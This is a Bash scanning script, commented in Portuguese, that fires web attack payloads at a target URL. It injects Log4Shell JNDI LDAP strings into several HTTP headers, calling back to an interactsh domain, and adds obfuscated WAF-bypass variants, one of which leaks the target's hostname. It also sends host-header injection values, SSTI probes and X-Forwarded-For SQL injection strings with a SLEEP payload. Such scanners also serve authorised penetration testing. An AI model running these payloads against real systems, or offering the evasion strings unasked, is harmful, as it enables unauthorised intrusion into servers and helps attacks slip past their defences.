#!/bin/bash
TARGET=$1

# Inicia interactsh-client em background e captura o domínio
echo "[*] Iniciando interactsh-client..."
interactsh-client -json -o /tmp/interactsh_output.txt &
IACT_PID=$!
sleep 3

# Pega o domínio gerado
IACT_DOMAIN=$(cat /tmp/interactsh_output.txt | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        if 'domain' in d:
            print(d['domain'])
            break
    except: pass
")

echo "[*] Domínio interactsh: $IACT_DOMAIN"
echo "[*] Testando headers em $TARGET"
echo ""

# Headers para testar
HEADERS=("User-Agent" "X-Api-Version" "X-Forwarded-For" "Referer" "X-Client-IP" "X-Forwarded-Host" "X-Originating-IP")

# Log4Shell com callback DNS real
echo "=== Log4Shell (CVE-2021-44228) ==="
for header in "${HEADERS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
    -H "$header: \${jndi:ldap://$IACT_DOMAIN/a}" \
    "$TARGET")
  echo "[$code] $header"
done

# Bypass de WAF
echo ""
echo "=== Log4Shell WAF Bypass ==="
BYPASSES=(
  "\${j\${::-n}di:ldap://$IACT_DOMAIN/a}"
  "\${jndi:ldap://\${hostName}.$IACT_DOMAIN/a}"
  "\${jndi:\${lower:l}dap://$IACT_DOMAIN/a}"
)
for bypass in "${BYPASSES[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
    -H "User-Agent: $bypass" "$TARGET")
  echo "[$code] Bypass: $bypass"
done

# Host Header Injection
echo ""
echo "=== Host Header Injection ==="
for header in "Host" "X-Forwarded-Host" "X-Host"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
    -H "$header: $IACT_DOMAIN" "$TARGET")
  echo "[$code] $header"
done

# SSTI
echo ""
echo "=== SSTI Detection ==="
for payload in '{{7*7}}' '${7*7}' '*{7*7}' '#{7*7}' '<%= 7*7 %>'; do
  result=$(curl -s --max-time 5 -H "User-Agent: $payload" "$TARGET")
  if echo "$result" | grep -q "49"; then
    echo "[FOUND] User-Agent: $payload"
  else
    echo "[    ] User-Agent: $payload"
  fi
done

# X-Forwarded-For SQLi
echo ""
echo "=== XFF SQLi Indication ==="
for payload in "'" "' OR 1=1--" "1; SELECT SLEEP(5)--"; do
  time=$(curl -s -o /dev/null -w "%{time_total}" --max-time 10 \
    -H "X-Forwarded-For: $payload" "$TARGET")
  echo "[${time}s] XFF: $payload"
done

# Aguarda callbacks DNS
echo ""
echo "[*] Aguardando callbacks DNS por 15s..."
sleep 15

echo ""
echo "=== Callbacks recebidos ==="
cat /tmp/interactsh_output.txt | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        if 'protocol' in d:
            print(f\"[{d.get('protocol','?').upper()}] de {d.get('remote-address','?')} → {d.get('full-id','?')}\")
    except: pass
"

# Finaliza interactsh
kill $IACT_PID 2>/dev/null
rm -f /tmp/interactsh_output.txt

echo ""
echo "[*] Scan finalizado — $TARGET"
